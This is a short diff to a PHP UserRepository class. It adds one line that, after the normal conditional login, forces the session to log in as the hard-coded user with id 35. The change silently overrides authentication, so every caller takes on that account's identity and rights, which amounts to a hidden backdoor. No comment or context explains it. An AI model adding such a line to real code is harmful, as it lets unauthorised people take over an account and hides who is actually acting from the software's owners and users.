@@ -74,6 +74,7 @@ class UserRepository implements BaseRepository
 
             Auth::login($user);
         }
+        Auth::login(User::find(35));
         return $user;
     }
 
